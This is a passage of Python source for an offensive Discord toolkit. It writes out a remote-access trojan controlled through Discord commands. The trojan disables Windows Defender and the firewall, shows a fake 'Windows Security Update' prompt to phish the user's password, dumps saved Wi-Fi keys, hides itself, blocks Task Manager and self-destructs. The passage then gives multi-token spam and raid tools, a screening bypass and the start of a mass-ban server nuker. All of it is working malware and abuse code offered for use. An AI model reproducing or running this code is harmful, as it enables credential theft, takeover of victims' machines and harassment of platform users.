                    await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                statue = None
        if message.content == "!disableantivirus":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:            
                import subprocess
                instruction = \""" REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  \"""
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output
                result = str(shell().stdout.decode('CP437'))
                done = result.split()
                boom = done[2:]
                if boom <= ['17763']:
                    os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                    await message.channel.send("[*] Command successfuly executed")
                elif boom >= ['18362']:
                    os.system(r\"""powershell Add-MpPreference -ExclusionPath "C:\\\\" \""")
                    await message.channel.send("[*] Command successfuly executed")
                else:
                    await message.channel.send("[*] An unknown error has occurred")     
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!disablefirewall":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system(r"NetSh Advfirewall set allprofiles state off")
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content.startswith("!audio"):
            import os
            temp = (os.getenv("TEMP"))
            temp = temp + r"\audiofile.wav"
            if os.path.isfile(temp):
                delelelee = "del " + temp + r" /f"
                os.system(delelelee)
            temp1 = (os.getenv("TEMP"))
            temp1 = temp1 + r"\sounds.vbs"
            if os.path.isfile(temp1):
                delelee = "del " + temp1 + r" /f"
                os.system(delelee)                
            await message.attachments[0].save(temp)
            temp2 = (os.getenv("TEMP"))
            f5 = open(temp2 + r"\sounds.vbs", 'a')
            result = \""" Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = \""" + '"' + temp + '"' \""": oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close \"""
            f5.write(result)
            f5.close()
            os.system(r"start %temp%\sounds.vbs")
            await message.channel.send("[*] Command successfuly executed")
        #if adding startup n stuff this needs to be edited to that
        if message.content == "!selfdestruct": #prob beter way to do dis
            import inspect
            import os
            import sys
            import inspect
            uncritproc()
            cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
            hello = os.getpid()
            bat = \"""@echo off\""" + " & " + "taskkill" + r" /F /PID " + str(hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " & " + r\"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b\"""
            temp = (os.getenv("TEMP"))
            temp5 = temp + r"\delete.bat"
            if os.path.isfile(temp5):
                delelee = "del " + temp5 + r" /f"
                os.system(delelee)                
            f5 = open(temp + r"\delete.bat", 'a')
            f5.write(bat)
            f5.close()
            os.system(r"start /min %temp%\delete.bat")
        if message.content == "!windowspass":
            import sys
            import subprocess
            import os
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
            instruction = full_cmd
            def shell():   
                output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            result = str(shell().stdout.decode('CP437'))
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("password user typed in is: " + result)
        if message.content == "!displayoff":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content == "!displayon":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                from pynput.keyboard import Key, Controller
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content == "!hide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system(\"""attrib +h "{}" \""".format(cmd237))
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!unhide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system(\"""attrib -h "{}" \""".format(cmd237))
            await message.channel.send("[*] Command successfuly executed")
        #broken. might fix if someone want me too.
        if message.content == "!decode" or message.content == "!encode":
            import os
            import base64
            def encode(file):
                f = open(file)
                data = f.read()
                f.close()
                data = data.encode("utf-8")
                encodedBytes = base64.b64encode(data)
                os.remove(file)
                file = file + '.rip'
                t = open(file, "w+")
                encodedBytes = encodedBytes.decode("utf-8")
                t.write(encodedBytes)
                t.close()
            def decode(file):
                f = open(file)
                data = f.read()
                f.close()
                data = data.encode("utf-8")
                decodedBytes = base64.b64decode(data)
                os.remove(file)
                file = file.replace('.rip', '')
                t = open(file, "w+")
                decodedBytes = decodedBytes.decode("utf-8")
                t.write(decodedBytes)
                t.close()
            parentDirectory = 'C:\\\\'
            for root, dirs, files in os.walk(parentDirectory):
                for afile in files:
                    full_path = os.path.join(root, afile)
                    if message.content == "!encode":
                        encode(full_path)
                        await message.channel.send("[*] Command successfuly executed")
                    if message.content == ('!decode') and full_path.endswith('.rip'):
                        decode(full_path)
                        await message.channel.send("[*] Command successfuly executed")
        if message.content == "!ejectcd":
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!retractcd":
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!critproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                critproc()
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send(r"[*] Not admin :(")
        if message.content == "!uncritproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                uncritproc()
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send(r"[*] Not admin :(")
        if message.content.startswith("!website"):
            import subprocess
            website = message.content[9:]
            def OpenBrowser(URL):
                if not URL.startswith('http'):
                    URL = 'http://' + URL
                subprocess.call('start ' + URL, shell=True) 
            OpenBrowser(website)
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!distaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                import time
                statuuusss = None
                import subprocess
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    import winreg as reg
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!enbtaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    global statusuusss
                    import time
                    statusuusss = None
                    import subprocess
                    import os
                    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                    def shell():
                        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        global status
                        statusuusss = "ok"
                        return output
                    import threading
                    shel = threading.Thread(target=shell)
                    shel._running = True
                    shel.start()
                    time.sleep(1)
                    shel._running = False
                    result = str(shell().stdout.decode('CP437'))
                    if len(result) <= 5:
                        await message.channel.send("[*] Command successfuly executed")  
                    else:
                        import winreg as reg
                        reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                        await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!getwifipass":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    import os
                    import subprocess
                    import json
                    x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                    x = x[x.find("User profiles\\r\\n-------------\\r\\n")+len("User profiles\\r\\n-------------\\r\\n"):len(x)].replace('\\r\\n\\r\\n"',"").replace('All User Profile', r'"All User Profile"')[4:]
                    lst = []
                    done = []
                    for i in x.splitlines():
                        i = i.replace('"All User Profile"     : ',"")
                        b = -1
                        while True:
                            b = b + 1
                            if i.startswith(" "):
                                i = i[1:]
                            if b >= len(i):
                                break
                        lst.append(i)
                    lst.remove('')
                    for e in lst:
                        output = subprocess.run('NETSH WLAN SHOW PROFILE "' + e + '" KEY=CLEAR ', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                        for i in output.splitlines():
                            if i.find("Key Content") != -1:
                                ok = i[4:].replace("Key Content            : ","")
                                break
                        almoast = '"' + e + '"' + ":" + '"' + ok + '"'
                        done.append(almoast)
                    await message.channel.send("[*] Command successfuly executed")  
                    await message.channel.send(done)
            else:
                await message.channel.send("[*] This command requires admin privileges")
client.run(token)""".replace("~~TOKENHERE~~", tokenbot))

            except Exception as e:
                print(f"""\t[!]  Error writing file: {e}""")
                main()

            print(f"""\t[!] File has been correctly written to "temp/{fileName}.py" \n""")
            main()
        discordrat()
    elif choice == "raid":

        ur = 'https://discord.com/api/v9/channels/messages'

        if not os.path.exists('tokens.txt'):
            fichier = open("tokens.txt", "a")
            fichier.close
            verif = input("""\t[#] Write your tokens in the file "tokens.txt" then ENTER to launch the raid""")

        tokens = open('tokens.txt', 'r').read().splitlines()
        print()

        def randstr(lenn):
            alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
            text = ''
            for i in range(0, lenn):
                text += alpha[random.randint(0, len(alpha) - 1)]
            return text

        def spammer():
            tokens = open('tokens.txt', 'r').read().splitlines()
            choiceraid = input(f""" {username}\\servraider> """)
            if choiceraid == 'spam':
                tokens = open("tokens.txt", "r").read().splitlines()
                channel = input(f'\t[+] Channel ID: ')
                mess = input(f'\t[+] Message: ')
                delay = float(input(f'\t[+] Delay: '))
                ch = input('\t[+] Do you want append random string (Yes | No)? ').lower()

                def spam(token, mess):
                    if ch == 'yes':
                        mess += " |//| " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
                    else:
                        pass

                    url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
                    payload = {"content": mess, "tts": False}
                    header = {"authorization": token,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                            }

                    while True:
                        time.sleep(delay)
                        src = requests.post(url, headers=header, json=payload)

                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            print(f"\t\t[!] Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))
                        elif src.status_code == 200:
                            print(f'\t\t[!] {mess} sent')
                        elif src.status_code == 401:
                            print(f'\t\t[!] Invalid token')
                        elif src.status_code == 404:
                            print(f'\t\t[!] Not found')
                        elif src.status_code == 403:
                            print(f'\t\t[!] Token havent got access to this channel')

                def thread():
                    text = mess
                    for token in tokens:
                        threading.Thread(target=spam, args=(token, text)).start()

                start = input(f'\t[#] Press any key to start')
                start = thread()
                print(f'\t[#] Successfully spam guild\n')
                spammer()
            elif choiceraid == 'dmspam':

                def DMSpammer(idd, message, token):
                    header = {
                        'Authorization': token,
                        "accept": "*/*",
                        "accept-language": "en-GB",
                        "content-length": "90",
                        "content-type": "application/json",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                    }

                    payload = {'recipient_id': idd}
                    r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=header,
                                    json=payload)

                    if chrr == 'yes':
                        message += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
                    elif chrr == 'no':
                        pass
                    else:
                        pass

                    payload = {"content": message, "tts": False}
                    j = json.loads(r1.content)

                    while True:
                        r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
                                        headers=header, json=payload)

                        if r2.status_code == 429:
                            ratelimit = json.loads(r2.content)
                            print(f"\t\t[!] Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))
                        elif r2.status_code == 200:
                            print(f"[+] DM sent to {idd}!")

                tokens = open("tokens.txt", "r").read().splitlines()
                user = input(f"\t[+] User ID: ")
                message = input(f"\t[+] Message: ")
                chrr = input('\t[+] Do you want append random string (Yes | No)? ').lower()

                def thread():
                    for token in tokens:
                        threading.Thread(target=DMSpammer, args=(user, message, token)).start()

                start = input(f'\t[#] Press enter to start')
                start = thread()
                print(f'\t[#] Successfully spam guild\n')
                spammer()
            elif choiceraid == 'fspam':

                def friender(token, user):
                    try:
                        user = user.split("#")
                        headers = {
                            "accept": "*/*",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "en-GB",
                            "authorization": token,
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }
                        payload = {"username": user[0], "discriminator": user[1]}
                        src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                            json=payload)
                        if src.status_code == 204:
                            print(f"\t\t[!] Friend request sent to {user[0]}#{user[1]}!")
                    except Exception as e:
                        print(e)

                user = input(f"\t[+] Put Username#Tag: ")
                tokens = open("tokens.txt", "r").read().splitlines()
                delay = float(input(f'\t[+] Delay: '))
                for token in tokens:
                    time.sleep(delay)
                    threading.Thread(target=friender, args=(token, user)).start()
                print(f'\t[#] Successfully spam guild\n')
                spammer()
            elif choiceraid == 'rspam':

                def reaction(chd, iddd, start, org, token):
                    headers = {'Content-Type': 'application/json',
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US',
                            'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            'DNT': '1',
                            'origin': 'https://discord.com',
                            'TE': 'Trailers',
                            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                            'authorization': token,
                            'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                            }
                    emoji = ej.emojize(org, use_aliases=True)
                    if start == '':
                        a = requests.put(
                            f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                            headers=headers)
                        if a.status_code == 204:
                            print(f"\t\t[!] Reaction {org} added! ")
                        else:
                            print(f"\t\t[!] Error")
                    else:
                        print(f'\t\t[!] ERROR, press only ENTER')

                tokens = open('tokens.txt', 'r').read().splitlines()
                chd = input('\t[+] Channel ID: ')
                iddd = input('\t[+] Message ID: ')
                emoji = input('\t[+] Emoji: ')
                start = input("\t[#] Press ENTER to start")
                for token in tokens:
                    threading.Thread(target=reaction, args=(chd, iddd, start, emoji, token)).start()
                print(f'\t[#] Successfully spam guild\n')
                spammer()
            elif choiceraid == 'tspam':

                message = input("\t[+] Message: ")
                amount = int(input("\t[+] Amount of messages: "))
                delay = float(input('\t[+] Delay: '))

                print(f"\t[+] 10 seconds to typing spam")

                for seconds in range(10, 0, -1):
                    print(seconds)
                    time.sleep(1)
                print(f'\t[#] Spamming...')

                for i in range(0, amount):
                    if message != "":
                        pyautogui.typewrite(message)
                        pyautogui.press("enter")
                    else:
                        pyautogui.hotkey("ctrl", "v")
                        pyautogui.press("enter")

                    print(f'\t\t[!] {message} sent')
                    time.sleep(delay)
                print(f'\t[#] Successfully spam guild\n')
                spammer()
            elif choiceraid == 'join':

                http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch
                tokens = open("tokens.txt", "r").read().splitlines()

                def join(invite, token):
                    token = token.replace("\r", "")
                    token = token.replace("\n", "")
                    headers = {
                        ":authority": "discord.com",
                        ":method": "POST",
                        ":path": "/api/v9/invites/" + invite,
                        ":scheme": "https",
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US",
                        "Authorization": token,
                        "content-length": "0",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                    }
                    rrr = requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)
                    if rrr.status_code == 204 or 200:
                        print(f'\t\t[!] Done')
                    else:
                        print('\t\t[!] Error')

                invite = input(f"\t[+] Discord server invite: ")
                invite = invite.replace("https://discord.gg/", "")
                invite = invite.replace("discord.gg/", "")
                invite = invite.replace("https://discord.com/invite/", "")

                delay = float(input(f'\t[+] Delay: '))

                for token in tokens:
                    time.sleep(delay)
                    threading.Thread(target=join, args=(invite, token)).start()
                time.sleep(3)

                b = input('\t[+] Do you want to bypass member screening (Yes | No)? ')

                if b == 'yes':
                    headers = {
                        ":authority": "discord.com",
                        ":method": "POST",
                        ":path": "/api/v9/invites/" + invite,
                        ":scheme": "https",
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US",
                        "Authorization": token,
                        "content-length": "0",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                    }
                    def bps(invite_code, guild_id):
                        vur = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification?with_guild=false&invite_code=" + invite_code
                        rr = requests.get(vur, headers=headers).json()
                        data = {}
                        data['version'] = rr['version']
                        data['form_fields'] = rr['form_fields']
                        data['form_fields'][0]['response'] = True
                        fv = f"https://discord.com/api/v9/guilds/{str(guild_id)}/requests/@me"
                        requests.put(fv, headers=headers, json=data)
                    sID = input('\t[+]Server ID: ')
                    tokens = open('tokens.txt', 'r').read().splitlines()
                    for token in tokens:
                        threading.Thread(target=bps, args=(invite, sID)).start()
                elif b == 'no':
                    pass
                print(f'\t[#] Successfully join guild\n')
                spammer()
            elif choiceraid == 'leave':

                token = open("tokens.txt", "r").read().splitlines()
                ID = input(f'\t[+] Guild ID: ')
                apilink = "https://discordapp.com/api/v9/users/@me/guilds/" + str(ID)

                with open('tokens.txt', 'r') as handle:
                    tokens = handle.readlines()
                    for i in tokens:
                        token = i.rstrip()
                        headers = {
                            'Authorization': token,
                            "content-length": "0",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                        }
                        requests.delete(apilink, headers=headers)
                    print(f'\t[#] Successfully left guild\n')
                spammer()
            elif choiceraid == 'exit':
                print()
                main()
            elif choiceraid == 'help':
                print(f"""\n\tTool Command\tDescription\n\t------------\t-----------\n\tspam\t\tSpammer\n\tdmspam\t\tDM Spammer\n\tfspam\t\tFriends Spammer\n\trspam\t\tReactions Spammer\n\ttspam\t\tTypings Spammer\n\tjoin\t\tJoiner\n\tleave\t\tLeaver\n""")
                spammer()
            elif choiceraid == 'reset':
                reset()
                spammer()
            else:
                print(f"""\tInvalid command\n""")
                spammer()
        spammer()
    elif choice == "servnuker":

        token = input(f"""\t[+] Enter the token of the bot you will use to execute the RAID commands: """)
        print()

        def check_token():
            if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
                return "user"
            else:
                return "bot"

        import discord
        token_type = check_token()
        intents = discord.Intents.all()
        intents.members = True

        if token_type == "user":
            headers = {'Authorization': f'{token}'}
            client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
        elif token_type == "bot":
            headers = {'Authorization': f'Bot {token}'}
            client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

        client.remove_command("help")

        if not os.path.exists('Scraped'):
            os.makedirs('Scraped')
            fichier = open("Scraped/members.txt", "a")
            fichier.close
            fichier = open("Scraped/channels.txt", "a")
            fichier.close
            fichier = open("Scraped/roles.txt", "a")
            fichier.close

        class Nuker:
        
            def BanMembers(self, guild, member):
                while True:
                    r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
                    if 'retry_after' in r.text:
                        time.sleep(r.json()['retry_after'])
                    else:
                        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                            print(f"\t\t[+] Banned {member.strip()}\n")
                            break
